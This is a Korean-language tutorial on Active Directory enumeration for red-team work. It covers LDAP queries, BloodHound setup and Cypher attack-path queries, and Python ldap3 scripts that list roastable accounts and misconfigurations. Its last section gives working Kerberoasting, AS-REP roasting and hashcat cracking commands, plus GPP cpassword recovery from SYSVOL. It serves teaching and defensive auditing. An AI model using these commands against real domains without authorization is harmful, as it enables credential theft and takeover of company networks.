> 🌐 **Language / 언어**: [🇰🇷 한국어](#한국어) | [🇺🇸 English](#english)

---

<a name="한국어"></a>

# Active Directory 열거 — BloodHound·LDAP·자동화

## 0. 초보자를 위한 Active Directory 개념 설명

### 0.1 Active Directory란 무엇인가? (회사 전화번호부 비유)

Active Directory(AD)를 처음 접하면 복잡하게 느껴진다. 가장 쉬운 비유는 **"회사 전화번호부 + 출입 통제 시스템"**이다.

```
[현실 세계 비유]

회사 건물 = 도메인 (domain.local)
 ├── 직원 명부 = 사용자 계정 (User accounts)
 ├── 부서 목록 = 그룹 (Groups)
 ├── 각 방의 열쇠 = 권한 (Permissions)
 ├── 경비실 = 도메인 컨트롤러 (Domain Controller)
 └── 건물 안내판 = LDAP 디렉터리 서비스

경비실(DC)이 하는 일:
  - 직원이 열쇠(비밀번호)로 출입 시도 → 명부 확인 → 허가/거절
  - 모든 방의 열쇠 정보를 중앙 관리
  - 부서 이동 시 권한 자동 업데이트
```

실제 기업 환경에서 Active Directory는:
- 수천 명의 직원 계정을 한 곳에서 관리
- 어떤 컴퓨터에서 로그인해도 같은 계정 사용 가능
- 파일 서버, 이메일, 업무 시스템 모두 AD 계정으로 통합 인증

**공격자 관점:** AD를 장악하면 회사 IT 인프라 전체를 통제할 수 있다. 그래서 AD는 레드팀의 최종 목표이자 방어팀의 핵심 보호 대상이다.

### 0.2 도메인, 포레스트, OU 구조

```
[AD 구조 계층도]

포레스트 (Forest) = 최상위 경계
└── 도메인 (Domain): corp.local
    ├── 트리 도메인: asia.corp.local
    │   └── 하위 도메인: kr.asia.corp.local
    └── OU (Organizational Unit) = 폴더와 같은 개념
        ├── OU=서울사무소
        │   ├── OU=개발팀
        │   │   ├── user: alice (alice@corp.local)
        │   │   └── user: bob
        │   └── OU=영업팀
        └── OU=서버
            ├── computer: WEB01
            └── computer: DB01
```

| 개념 | 설명 | 비유 |
|------|------|------|
| 포레스트 | 모든 도메인의 최상위 집합 | 기업 그룹 전체 |
| 도메인 | 보안 경계 단위 | 계열사 |
| OU | 도메인 내 조직 단위 | 부서 |
| 트러스트 | 도메인 간 신뢰 관계 | 계열사 간 협약 |
| DC | 도메인 컨트롤러, 인증 서버 | 경비실 |
| GPO | 그룹 정책, 도메인 전체 설정 | 사내 규정 |

### 0.3 LDAP이란 무엇인가?

LDAP(Lightweight Directory Access Protocol)은 AD의 **"조회 언어"**다. 회사 전화번호부에서 "개발팀 직원 중 이름이 김씨인 사람 찾기"를 하는 것처럼, LDAP 쿼리로 AD에서 원하는 객체를 검색한다.

```
[LDAP 구조 이해]

DN (Distinguished Name) = 객체의 전체 경로:
  CN=Alice,OU=개발팀,OU=서울사무소,DC=corp,DC=local
   │         │               │           │
  이름      부서           사무소        도메인

LDAP 필터 문법:
  (objectClass=user)            → 사용자 객체 모두
  (sAMAccountName=alice)        → 계정명이 alice인 것
  (&(objectClass=user)(mail=*)) → 이메일이 있는 사용자
  (|(cn=alice)(cn=bob))         → alice 또는 bob
  (!objectClass=computer))      → 컴퓨터가 아닌 것
```

---

## 1. AD 공격 로드맵

```
초기 접근 (Initial Access)
    │
    ▼
AD 열거 (Enumeration) ←── 여기서 시작
    │  - 도메인 정보·사용자·그룹·컴퓨터
    │  - 신뢰 관계·GPO·ACL
    ▼
Kerberos 공격
    │  - Kerberoasting·AS-REP Roasting
    ▼
횡이동 (Lateral Movement)
    │  - Pass-the-Hash·Pass-the-Ticket
    │  - NTLM 릴레이·DCSync
    ▼
도메인 장악 (Domain Dominance)
       - Golden Ticket·Silver Ticket
       - AdminSDHolder·ACL 남용
```

---

## 2. 기본 AD 열거 명령어

### 2.1 PowerShell 기반

```powershell
# 도메인 기본 정보
Get-ADDomain
[System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()

# 도메인 사용자 열거
Get-ADUser -Filter * -Properties * | Select-Object Name, SamAccountName, MemberOf, LastLogonDate

# 관리자 그룹 멤버
Get-ADGroupMember "Domain Admins" -Recursive
Get-ADGroupMember "Enterprise Admins" -Recursive
Get-ADGroupMember "Administrators" -Recursive

# 도메인 컨트롤러
Get-ADDomainController -Filter *

# SPN 설정된 계정 (Kerberoasting 대상)
Get-ADUser -Filter {ServicePrincipalName -ne "$null"} -Properties ServicePrincipalName |
  Select-Object SamAccountName, ServicePrincipalName

# Pre-auth 불필요 계정 (AS-REP Roasting 대상)
Get-ADUser -Filter {DoesNotRequirePreAuth -eq $true} -Properties DoesNotRequirePreAuth |
  Select-Object SamAccountName

# GPO 열거
Get-GPO -All | Select-Object DisplayName, Id, GpoStatus

# 컴퓨터 계정 (WinRM 활성화 대상 탐색)
Get-ADComputer -Filter * -Properties OperatingSystem |
  Where-Object {$_.OperatingSystem -like "*Server*"} |
  Select-Object Name, OperatingSystem, DNSHostName
```

### 2.2 LDAP 쿼리 (Linux)

```bash
# LDAP 기본 열거
ldapsearch -x -H ldap://10.10.10.100 -D "DOMAIN\user" -w "Password123" \
  -b "DC=domain,DC=local" "(objectClass=user)" cn sAMAccountName memberOf

# 익명 LDAP 열거 시도
ldapsearch -x -H ldap://10.10.10.100 -b "" -s base namingContexts

# 모든 사용자 덤프
ldapsearch -x -H ldap://10.10.10.100 -D "user@domain.local" -w "Password" \
  -b "DC=domain,DC=local" "(&(objectClass=user)(objectCategory=person))" \
  sAMAccountName displayName mail memberOf | tee users.ldif

# SPN 계정
ldapsearch -x -H ldap://DC_IP -D "user@domain.local" -w "Password" \
  -b "DC=domain,DC=local" "(&(servicePrincipalName=*)(objectClass=user))" \
  sAMAccountName servicePrincipalName
```

### 2.3 주요 LDAP 필터 레퍼런스

| 목적 | LDAP 필터 |
|------|-----------|
| 모든 사용자 | `(&(objectClass=user)(objectCategory=person))` |
| 활성화된 계정만 | `(&(objectClass=user)(!(userAccountControl:1.2.840.113556.1.4.803:=2)))` |
| SPN 설정 계정 | `(&(objectClass=user)(servicePrincipalName=*))` |
| PreAuth 불필요 | `(userAccountControl:1.2.840.113556.1.4.803:=4194304)` |
| 비밀번호 만료 없음 | `(userAccountControl:1.2.840.113556.1.4.803:=65536)` |
| 모든 그룹 | `(objectClass=group)` |
| 모든 컴퓨터 | `(objectClass=computer)` |
| DC 계정 | `(&(objectCategory=computer)(userAccountControl:1.2.840.113556.1.4.803:=8192))` |

---

## 3. BloodHound 수집 및 분석

### 3.1 BloodHound란 무엇인가?

BloodHound는 AD 공격 경로를 **그래프 데이터베이스(Neo4j)**로 시각화하는 도구다.

```
[BloodHound가 하는 일]

AD 데이터 수집 (SharpHound)
        │
        ▼
Neo4j 그래프 DB에 저장
        │
        ▼
시각화 + Cypher 쿼리로 공격 경로 탐색

예시: "일반 사용자 alice에서 Domain Admin까지 가는 경로가 있는가?"
  alice → 로컬 관리자(WEB01) → WEB01에서 세션 가진 admin → Domain Admin
```

### 3.2 BloodHound 설치 및 설정 (단계별)

```bash
# --- Neo4j 설치 (Ubuntu/Debian) ---
# Java 설치
sudo apt install -y openjdk-11-jdk

# Neo4j 저장소 추가
wget -O - https://debian.neo4j.com/neotechnology.gpg.key | sudo apt-key add -
echo 'deb https://debian.neo4j.com stable latest' | sudo tee /etc/apt/sources.list.d/neo4j.list
sudo apt update && sudo apt install -y neo4j

# Neo4j 서비스 시작
sudo systemctl start neo4j
sudo systemctl enable neo4j

# Neo4j 초기 비밀번호 변경
# 브라우저에서 http://localhost:7474 접속
# 기본 계정: neo4j / neo4j → 새 비밀번호로 변경

# --- BloodHound GUI 설치 ---
# GitHub 릴리즈에서 최신 버전 다운로드
wget https://github.com/SpecterOps/BloodHound-Legacy/releases/download/v4.3.1/BloodHound-linux-x64.zip
unzip BloodHound-linux-x64.zip
cd BloodHound-linux-x64
./BloodHound --no-sandbox

# BloodHound 실행 후 Neo4j 자격증명으로 로그인
```

```bash
# --- BloodHound CE (Community Edition, 최신 버전) ---
# Docker Compose로 실행
git clone https://github.com/SpecterOps/BloodHound.git
cd BloodHound
docker compose -f docker-compose.yml up -d

# 접속: http://localhost:8080
# 초기 자격증명은 콘솔 출력에서 확인
```

### 3.3 SharpHound 데이터 수집 (단계별 가이드)

```powershell
# SharpHound 실행 (PowerShell)
Invoke-BloodHound -CollectionMethod All -OutputDirectory C:\temp

# 특정 수집 방법
# - Default: 기본 (세션·로컬 관리자·그룹 멤버십)
# - All: 전체
# - Session: 활성 세션만
# - DCOnly: DC에서만 수집 (네트워크 소음 최소화)
Invoke-BloodHound -CollectionMethod DCOnly -Compress

# Kerberos 인증으로 원격 수집
.\SharpHound.exe -c All --domain domain.local \
  --domaincontroller 10.10.10.100 \
  --ldapusername user --ldappassword Password
```

```bash
# bloodhound-python (Linux, 도메인 참가 없이)
pip install bloodhound
bloodhound-python -u user@domain.local -p Password \
  -ns 10.10.10.100 -d domain.local -c all \
  --zip -o /tmp/bloodhound/
```

### 3.4 SharpHound 수집 방법 비교

| 수집 방법 | 설명 | 네트워크 소음 | 권장 상황 |
|-----------|------|--------------|-----------|
| `Default` | 세션, 로컬 관리자, 그룹 | 보통 | 일반 환경 |
| `All` | 전체 (Default + ACL + ObjectProps) | 높음 | 느린 환경 허용 시 |
| `DCOnly` | DC에서만 LDAP 쿼리 | 낮음 | 은밀한 수집 필요 시 |
| `Session` | 로그온 세션만 | 매우 높음 | 세션 정보 필요 시 |
| `ACL` | ACL 정보만 | 낮음 | 권한 분석에 집중 시 |
| `ObjectProps` | 객체 속성만 | 낮음 | 기본 열거 후 보완 |

### 3.5 BloodHound 데이터 임포트 및 분석

```
[BloodHound 사용 워크플로우]

1. SharpHound/bloodhound-python 실행 → ZIP 파일 생성
2. BloodHound GUI 실행
3. 우측 상단 Upload Data 버튼 → ZIP 파일 업로드
4. 데이터베이스에 노드/엣지 생성 완료
5. 분석 시작:
   a. Pre-Built Analytics → Shortest Paths to Domain Admins
   b. Raw Query 탭 → 커스텀 Cypher 쿼리 입력
   c. 노드 클릭 → 속성, 관계 확인
   d. 경로에서 "Mark User as Owned" → 장악한 계정 표시
```

### 3.6 BloodHound Cypher 쿼리

```cypher
// 도메인 관리자까지 최단 경로
MATCH p=shortestPath((u:User {owned:true})-[*1..]->(g:Group {name:"DOMAIN ADMINS@DOMAIN.LOCAL"}))
RETURN p

// Kerberoasting 가능한 경로
MATCH (u:User {hasspn:true}) RETURN u.name, u.serviceprincipalnames

// AS-REP Roasting 대상
MATCH (u:User {dontreqpreauth:true}) RETURN u.name

// DCSync 권한 보유 계정
MATCH (n)-[:DCSync|AllExtendedRights|GenericAll]->(d:Domain) RETURN n.name, d.name

// 패스워드 만료 없는 계정
MATCH (u:User {pwdneverexpires:true, enabled:true}) RETURN u.name

// 로컬 관리자 경로
MATCH p=(u:User {owned:true})-[r:AdminTo]->(c:Computer) RETURN p

// 신뢰 관계 맵
MATCH (d1:Domain)-[r:TrustedBy]->(d2:Domain) RETURN d1.name, r.trusttype, d2.name
```

### 3.7 핵심 BloodHound Cypher 쿼리 (상세 설명 포함)

```cypher
// ===== 고가치 타깃 탐색 =====

// 1. 장악된 계정에서 DA까지 모든 경로 (최단 아닌 전체)
MATCH p=allShortestPaths(
  (u:User {owned:true})-[*1..10]->(g:Group {name:"DOMAIN ADMINS@CORP.LOCAL"})
)
RETURN p

// 설명: owned:true 는 BloodHound에서 수동으로 표시한 "장악한 계정"
// [*1..10] = 최대 10단계 관계 체인

// 2. 위험한 ACL 관계 탐색 (GenericAll, WriteDACL 등)
MATCH (u:User)-[r:GenericAll|WriteDACL|WriteOwner|GenericWrite]->(c)
WHERE u.enabled = true
RETURN u.name, type(r), c.name
ORDER BY u.name

// 설명: 이런 권한이 있으면 공격자가 직접 비밀번호 변경, 권한 부여 가능

// 3. Kerberoastable 계정 + 관리자 그룹 멤버십 확인
MATCH (u:User {hasspn:true})-[:MemberOf*1..]->(g:Group)
WHERE g.name CONTAINS "ADMIN"
RETURN u.name, u.serviceprincipalnames, g.name

// 4. 컴퓨터에서 DA 세션이 있는 경로
MATCH (c:Computer)-[:HasSession]->(u:User)-[:MemberOf*1..]->(g:Group {name:"DOMAIN ADMINS@CORP.LOCAL"})
RETURN c.name, u.name

// 설명: DA가 로그온한 컴퓨터 = 메모리에서 자격증명 탈취 가능

// 5. 비활성화되지 않은 계정 중 90일 이상 미로그온
MATCH (u:User)
WHERE u.enabled = true
  AND u.lastlogontimestamp < (timestamp() - 7776000000)
RETURN u.name, u.lastlogontimestamp
ORDER BY u.lastlogontimestamp

// 6. 신뢰 관계를 통한 다른 도메인 접근 경로
MATCH (d1:Domain {name:"CORP.LOCAL"})-[r:TrustedBy]->(d2:Domain)
RETURN d1.name, r.trusttype, r.transitive, d2.name

// 7. OU별 고위험 계정 분포
MATCH (u:User)-[:MemberOf]->(g:Group)
WHERE g.name CONTAINS "ADMIN" OR g.name CONTAINS "OPERATOR"
WITH split(u.distinguishedname, ",") AS dn_parts, u
RETURN dn_parts[1] AS ou, count(u) AS admin_count
ORDER BY admin_count DESC
```

---

## 4. AD 자동 열거 CLI

```python
#!/usr/bin/env python3
"""Active Directory 자동 열거 CLI — python-ldap3 기반."""

import argparse
import json
from dataclasses import dataclass, field
from pathlib import Path

from ldap3 import (
    ALL, ALL_ATTRIBUTES, NTLM, SAFE_SYNC,
    Connection, Server, SUBTREE, Tls,
)
from ldap3.core.exceptions import LDAPException


@dataclass
class ADObject:
    dn: str
    attributes: dict


@dataclass
class ADEnumResult:
    domain: str
    domain_controllers: list[str] = field(default_factory=list)
    users: list[ADObject] = field(default_factory=list)
    groups: list[ADObject] = field(default_factory=list)
    computers: list[ADObject] = field(default_factory=list)
    spn_accounts: list[ADObject] = field(default_factory=list)
    asrep_accounts: list[ADObject] = field(default_factory=list)


class ADEnumerator:
    def __init__(
        self,
        dc_ip: str,
        domain: str,
        username: str,
        password: str,
        use_tls: bool = False,
    ) -> None:
        self.domain = domain
        self.base_dn = ",".join(f"DC={part}" for part in domain.split("."))
        server = Server(dc_ip, get_info=ALL, use_ssl=use_tls)
        self.conn = Connection(
            server,
            user=f"{domain}\\{username}",
            password=password,
            authentication=NTLM,
            client_strategy=SAFE_SYNC,
            auto_bind=True,
        )

    def search(self, filter_: str, attributes: list[str]) -> list[ADObject]:
        self.conn.search(
            search_base=self.base_dn,
            search_filter=filter_,
            search_scope=SUBTREE,
            attributes=attributes,
        )
        return [
            ADObject(
                dn=entry.entry_dn,
                attributes={attr: entry[attr].values for attr in attributes if attr in entry},
            )
            for entry in self.conn.entries
        ]

    def enum_users(self) -> list[ADObject]:
        return self.search(
            "(&(objectClass=user)(objectCategory=person))",
            ["sAMAccountName", "displayName", "mail", "memberOf",
             "lastLogonTimestamp", "pwdLastSet", "userAccountControl"],
        )

    def enum_spn_accounts(self) -> list[ADObject]:
        return self.search(
            "(&(objectClass=user)(servicePrincipalName=*)(!(objectClass=computer)))",
            ["sAMAccountName", "servicePrincipalName", "memberOf"],
        )

    def enum_asrep_accounts(self) -> list[ADObject]:
        # userAccountControl bit 4194304 = DONT_REQ_PREAUTH
        return self.search(
            "(&(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=4194304))",
            ["sAMAccountName", "userAccountControl"],
        )

    def enum_domain_admins(self) -> list[ADObject]:
        da_dn = f"CN=Domain Admins,CN=Users,{self.base_dn}"
        return self.search(
            f"(memberOf={da_dn})",
            ["sAMAccountName", "displayName"],
        )

    def enum_computers(self) -> list[ADObject]:
        return self.search(
            "(objectClass=computer)",
            ["dNSHostName", "operatingSystem", "operatingSystemVersion", "lastLogonTimestamp"],
        )

    def enumerate_all(self) -> ADEnumResult:
        result = ADEnumResult(domain=self.domain)
        print("[*] Enumerating users...")
        result.users = self.enum_users()
        print(f"  Found: {len(result.users)}")

        print("[*] Enumerating SPN accounts (Kerberoasting targets)...")
        result.spn_accounts = self.enum_spn_accounts()
        print(f"  Found: {len(result.spn_accounts)}")

        print("[*] Enumerating AS-REP Roasting targets...")
        result.asrep_accounts = self.enum_asrep_accounts()
        print(f"  Found: {len(result.asrep_accounts)}")

        print("[*] Enumerating computers...")
        result.computers = self.enum_computers()
        print(f"  Found: {len(result.computers)}")

        return result

    def close(self) -> None:
        self.conn.unbind()


def main() -> None:
    parser = argparse.ArgumentParser(description="Active Directory Auto Enumeration")
    parser.add_argument("dc", help="Domain Controller IP")
    parser.add_argument("domain", help="Domain (e.g.: corp.local)")
    parser.add_argument("-u", "--user", required=True, help="Username")
    parser.add_argument("-p", "--password", required=True, help="Password")
    parser.add_argument("--tls", action="store_true", help="Use LDAPS")
    parser.add_argument("-o", "--output", type=Path, help="Save results path")
    args = parser.parse_args()

    try:
        enumerator = ADEnumerator(
            args.dc, args.domain, args.user, args.password, args.tls
        )
        result = enumerator.enumerate_all()
        enumerator.close()

        print(f"\n=== Results Summary: {args.domain} ===")
        print(f"Total users: {len(result.users)}")
        print(f"Kerberoasting targets: {len(result.spn_accounts)}")
        print(f"AS-REP Roasting targets: {len(result.asrep_accounts)}")
        print(f"Computers: {len(result.computers)}")

        if result.spn_accounts:
            print("\n[!] Kerberoasting target accounts:")
            for obj in result.spn_accounts:
                print(f"  {obj.attributes.get('sAMAccountName', ['?'])[0]}")

        if result.asrep_accounts:
            print("\n[!] AS-REP Roasting targets:")
            for obj in result.asrep_accounts:
                print(f"  {obj.attributes.get('sAMAccountName', ['?'])[0]}")

        if args.output:
            data = {
                "domain": result.domain,
                "users_count": len(result.users),
                "spn_accounts": [o.attributes for o in result.spn_accounts],
                "asrep_accounts": [o.attributes for o in result.asrep_accounts],
                "computers": [o.attributes for o in result.computers],
            }
            args.output.write_text(json.dumps(data, indent=2, default=str, ensure_ascii=False))
            print(f"\nResults saved: {args.output}")

    except LDAPException as e:
        print(f"LDAP error: {e}")
        raise SystemExit(1)


if __name__ == "__main__":
    main()
```

---

## 5. 고급 Python ldap3 열거 스크립트

```python
#!/usr/bin/env python3
"""
고급 AD 열거 스크립트 — 잘못된 설정(misconfiguration) 탐지 포함
사용법: python3 ad_misconfig_finder.py 10.10.10.100 corp.local -u alice -p Pass123
"""

import argparse
import json
from dataclasses import dataclass, field
from datetime import datetime, timezone, timedelta
from pathlib import Path
from typing import Any

from ldap3 import ALL, NTLM, SAFE_SYNC, Connection, Server, SUBTREE
from ldap3.core.exceptions import LDAPException


@dataclass
class Misconfiguration:
    category: str        # 카테고리 (예: KERBEROASTING, WEAK_PASSWORD)
    severity: str        # HIGH / MEDIUM / LOW
    account: str         # 영향받는 계정
    description: str     # 상세 설명
    recommendation: str  # 권고 조치


class ADMisconfigFinder:
    """AD 잘못된 설정 탐지기."""

    def __init__(self, dc_ip: str, domain: str, username: str, password: str) -> None:
        self.domain = domain
        self.base_dn = ",".join(f"DC={p}" for p in domain.split("."))
        server = Server(dc_ip, get_info=ALL)
        self.conn = Connection(
            server,
            user=f"{domain}\\{username}",
            password=password,
            authentication=NTLM,
            client_strategy=SAFE_SYNC,
            auto_bind=True,
        )
        self.findings: list[Misconfiguration] = []

    def _search(
        self,
        ldap_filter: str,
        attributes: list[str],
        base: str | None = None,
    ) -> list[Any]:
        self.conn.search(
            search_base=base or self.base_dn,
            search_filter=ldap_filter,
            search_scope=SUBTREE,
            attributes=attributes,
        )
        return list(self.conn.entries)

    def check_kerberoastable(self) -> None:
        """SPN이 설정된 일반 사용자 계정 탐지."""
        entries = self._search(
            "(&(objectClass=user)(servicePrincipalName=*)(!(objectClass=computer))"
            "(!(cn=krbtgt)))",
            ["sAMAccountName", "servicePrincipalName", "memberOf", "pwdLastSet"],
        )
        for entry in entries:
            username = str(entry.sAMAccountName)
            spns = list(entry.servicePrincipalName.values)
            pwd_age = "Unknown"
            if entry.pwdLastSet and entry.pwdLastSet.value:
                try:
                    last_set = entry.pwdLastSet.value
                    if isinstance(last_set, datetime):
                        age_days = (datetime.now(timezone.utc) - last_set.replace(tzinfo=timezone.utc)).days
                        pwd_age = f"{age_days}일"
                except Exception:
                    pass

            self.findings.append(Misconfiguration(
                category="KERBEROASTING",
                severity="HIGH",
                account=username,
                description=f"SPN 설정된 계정 (비밀번호 나이: {pwd_age}). SPNs: {spns[:2]}",
                recommendation="서비스 계정 비밀번호를 25자 이상 복잡한 값으로 변경하고, "
                               "MSA/gMSA 계정으로 전환 권장",
            ))

    def check_asrep_roastable(self) -> None:
        """Pre-authentication 불필요 계정 탐지."""
        entries = self._search(
            "(&(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=4194304))",
            ["sAMAccountName", "memberOf"],
        )
        for entry in entries:
            username = str(entry.sAMAccountName)
            self.findings.append(Misconfiguration(
                category="ASREP_ROASTING",
                severity="HIGH",
                account=username,
                description="Pre-authentication이 비활성화된 계정. "
                            "크래킹 가능한 해시를 인증 없이 획득 가능",
                recommendation="'계정에 Kerberos 사전 인증 필요 없음' 설정 해제",
            ))

    def check_password_never_expires(self) -> None:
        """비밀번호 만료 없는 계정 (서비스 계정 제외 필요)."""
        entries = self._search(
            "(&(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=65536)"
            "(!(objectClass=computer)))",
            ["sAMAccountName", "lastLogonTimestamp", "memberOf"],
        )
        for entry in entries:
            username = str(entry.sAMAccountName)
            # 관리자 그룹 멤버인지 확인
            members = [str(m) for m in (entry.memberOf.values if hasattr(entry.memberOf, "values") else [])]
            is_privileged = any("ADMIN" in m.upper() for m in members)
            self.findings.append(Misconfiguration(
                category="PWD_NEVER_EXPIRES",
                severity="HIGH" if is_privileged else "MEDIUM",
                account=username,
                description=f"비밀번호 만료 없는 계정. 특권 그룹 멤버: {is_privileged}",
                recommendation="비밀번호 만료 정책 적용. 서비스 계정은 gMSA로 전환",
            ))

    def check_admin_count(self) -> None:
        """adminCount=1인 계정 (보호 계정) 목록 — 과도한 경우 위험."""
        entries = self._search(
            "(&(objectClass=user)(adminCount=1)(!(cn=krbtgt)))",
            ["sAMAccountName", "memberOf"],
        )
        admin_users = [str(e.sAMAccountName) for e in entries]
        if len(admin_users) > 20:
            self.findings.append(Misconfiguration(
                category="EXCESSIVE_ADMINS",
                severity="MEDIUM",
                account=f"총 {len(admin_users)}개 계정",
                description=f"adminCount=1 계정이 {len(admin_users)}개. "
                            f"샘플: {admin_users[:5]}",
                recommendation="최소 권한 원칙 적용. 불필요한 관리자 권한 제거",
            ))

    def check_stale_accounts(self, days: int = 90) -> None:
        """장기 미로그온 활성 계정 탐지."""
        cutoff = datetime.now(timezone.utc) - timedelta(days=days)
        cutoff_str = cutoff.strftime("%Y%m%d%H%M%S.0Z")

        entries = self._search(
            f"(&(objectClass=user)(!(userAccountControl:1.2.840.113556.1.4.803:=2))"
            f"(lastLogonTimestamp<={cutoff_str})(lastLogonTimestamp>=19700101000000.0Z))",
            ["sAMAccountName", "lastLogonTimestamp"],
        )
        if len(entries) > 0:
            self.findings.append(Misconfiguration(
                category="STALE_ACCOUNTS",
                severity="MEDIUM",
                account=f"{len(entries)}개 계정",
                description=f"{days}일 이상 로그온하지 않은 활성 계정. "
                            f"비활성화되지 않고 여전히 도메인에 존재",
                recommendation="미사용 계정 비활성화 또는 삭제. 계정 수명주기 정책 수립",
            ))

    def run_all_checks(self) -> list[Misconfiguration]:
        """모든 잘못된 설정 검사 실행."""
        checks = [
            ("Kerberoastable 계정", self.check_kerberoastable),
            ("AS-REP Roastable 계정", self.check_asrep_roastable),
            ("비밀번호 만료 없는 계정", self.check_password_never_expires),
            ("과도한 관리자 계정", self.check_admin_count),
            ("90일 이상 미로그온 계정", self.check_stale_accounts),
        ]
        for desc, check_fn in checks:
            print(f"[*] {desc} 검사 중...")
            try:
                check_fn()
            except Exception as e:
                print(f"  오류: {e}")

        return self.findings

    def close(self) -> None:
        self.conn.unbind()


def main() -> None:
    parser = argparse.ArgumentParser(
        description="AD 잘못된 설정 탐지기",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
예시:
  python3 ad_misconfig_finder.py 10.10.10.100 corp.local -u alice -p Pass123
  python3 ad_misconfig_finder.py 10.10.10.100 corp.local -u alice -p Pass123 -o report.json
        """,
    )
    parser.add_argument("dc", help="도메인 컨트롤러 IP")
    parser.add_argument("domain", help="도메인 (예: corp.local)")
    parser.add_argument("-u", "--user", required=True, help="사용자명")
    parser.add_argument("-p", "--password", required=True, help="비밀번호")
    parser.add_argument("-o", "--output", type=Path, help="JSON 결과 파일")
    args = parser.parse_args()

    try:
        finder = ADMisconfigFinder(args.dc, args.domain, args.user, args.password)
        findings = finder.run_all_checks()
        finder.close()
    except LDAPException as e:
        print(f"LDAP 연결 오류: {e}")
        raise SystemExit(1)

    # 결과 출력
    severity_order = {"HIGH": 0, "MEDIUM": 1, "LOW": 2}
    findings.sort(key=lambda f: severity_order.get(f.severity, 99))

    print(f"\n{'='*65}")
    print(f"AD 잘못된 설정 탐지 결과 | {args.domain}")
    print(f"{'='*65}")

    high = sum(1 for f in findings if f.severity == "HIGH")
    medium = sum(1 for f in findings if f.severity == "MEDIUM")
    print(f"총 발견: {len(findings)}건 (HIGH: {high}, MEDIUM: {medium})")
    print()

    for finding in findings:
        icon = "[!]" if finding.severity == "HIGH" else "[?]"
        print(f"{icon} [{finding.severity}] {finding.category}")
        print(f"  계정: {finding.account}")
        print(f"  설명: {finding.description}")
        print(f"  권고: {finding.recommendation}")
        print()

    if args.output:
        report_data = {
            "scan_time": datetime.now(timezone.utc).isoformat(),
            "domain": args.domain,
            "summary": {"total": len(findings), "high": high, "medium": medium},
            "findings": [
                {
                    "category": f.category,
                    "severity": f.severity,
                    "account": f.account,
                    "description": f.description,
                    "recommendation": f.recommendation,
                }
                for f in findings
            ],
        }
        args.output.write_text(
            json.dumps(report_data, indent=2, ensure_ascii=False),
            encoding="utf-8",
        )
        print(f"[+] 결과 저장: {args.output}")


if __name__ == "__main__":
    main()
```

---

## 6. 흔한 AD 잘못된 설정 (초보자 가이드)

### 6.1 Kerberoasting이 가능한 이유

```
[Kerberoasting 원리]

정상 흐름:
  사용자 → KDC에게 "SQL Server에 접근하고 싶다"
  KDC → "SQL 서비스 계정(svc_sql)의 해시로 암호화된 티켓을 드릴게요"
  사용자 → SQL Server에게 티켓 제시 → 접근 허용

공격자 흐름:
  공격자 → KDC에게 "SQL Server에 접근하고 싶다" (정상 요청!)
  KDC → 암호화된 티켓 제공 (서비스 계정 해시로 암호화)
  공격자 → 티켓을 오프라인에서 크래킹 → 서비스 계정 비밀번호 획득!

문제점: 이 요청은 완전히 합법적이어서 탐지가 어렵다
```

```bash
# Kerberoasting 실행 (impacket)
python3 GetUserSPNs.py corp.local/alice:Password123 -dc-ip 10.10.10.100 -request

# 획득한 해시 크래킹
hashcat -m 13100 spn_hashes.txt /usr/share/wordlists/rockyou.txt
```

### 6.2 AS-REP Roasting이 가능한 이유

```
[AS-REP Roasting 원리]

정상 Kerberos 인증:
  클라이언트 → KDC: "저는 alice입니다" (암호화된 타임스탬프 포함)
  KDC: 타임스탬프 검증 후 TGT 발급

Pre-auth 비활성화된 경우:
  공격자 → KDC: "저는 alice입니다" (타임스탬프 불필요!)
  KDC: 검증 없이 alice의 해시로 암호화된 응답 전송
  공격자: 응답을 오프라인에서 크래킹 → alice 비밀번호 획득!

비유: 신분 확인 없이 "OOO씨 계신가요?"만 해도
      OOO씨 목소리(해시)를 들을 수 있는 상황
```

```bash
# AS-REP Roasting (impacket)
python3 GetNPUsers.py corp.local/ -no-pass -usersfile users.txt -dc-ip 10.10.10.100 -format hashcat

# 해시 크래킹
hashcat -m 18200 asrep_hashes.txt /usr/share/wordlists/rockyou.txt
```

### 6.3 주요 잘못된 설정 요약표

| 잘못된 설정 | 위험도 | 공격 기법 | 탐지 방법 |
|------------|--------|-----------|-----------|
| SPN 설정된 일반 계정 | HIGH | Kerberoasting | 이벤트 4769, RC4 암호화 요청 |
| Pre-auth 비활성화 | HIGH | AS-REP Roasting | 이벤트 4768 |
| 과도한 도메인 관리자 | HIGH | 직접 권한 남용 | 관리자 그룹 멤버 감사 |
| AdminSDHolder 수정 | HIGH | ACL 기반 지속성 | 이벤트 5136 |
| DCSync 권한 오부여 | CRITICAL | DCSync | 이벤트 4662 |
| 비밀번호 정책 없음 | MEDIUM | 브루트 포스 | 계정 잠금 임계값 확인 |
| LAPS 미사용 | MEDIUM | 로컬 관리자 해시 재사용 | LAPS 배포 현황 |
| SMB 서명 비활성화 | HIGH | NTLM 릴레이 | SMB 서명 정책 확인 |

### 6.4 GPP(Group Policy Preferences) 자격증명 노출 — cpassword

과거 GPP는 로그온 스크립트나 예약 작업, 드라이브 매핑에 쓸 로컬 계정 비밀번호를 그룹 정책 안에 AES-256으로 암호화해 저장했다. 문제는 마이크로소프트가 이 **AES 키를 공개 문서(MSDN)에 그대로 게시**했다는 점이다(MS14-025로 신규 생성은 막혔지만, 오래된 도메인의 SYSVOL에는 여전히 `Groups.xml` 파일이 남아있는 경우가 많다). SYSVOL은 인증된 도메인 사용자라면 누구나 읽을 수 있는 공유이므로, 낮은 권한 계정 하나만 있어도 로컬 관리자 비밀번호를 즉시 복호화할 수 있다.

```bash
# 1) SYSVOL에서 cpassword가 포함된 XML 찾기 (인증된 일반 사용자 권한으로 충분)
smbclient -U 'corp.local/alice%Password123' //10.10.10.100/SYSVOL -c \
  'recurse; ls' 2>/dev/null | grep -i xml

# 또는 마운트 후 직접 검색
find /mnt/sysvol -iname 'Groups.xml' -o -iname 'Services.xml' -o -iname 'ScheduledTasks.xml' \
  2>/dev/null | xargs grep -l cpassword

# 2) 공개된 AES 키로 복호화 (Kali 기본 포함 도구)
gpp-decrypt 'edBSHOwhZLTjt/QS9FeIcJ83njW+iuoU9jhr5CGFvW0'

# 3) PowerShell(Windows 진영, PowerSploit 계열)
# Get-GPPPassword.ps1
```

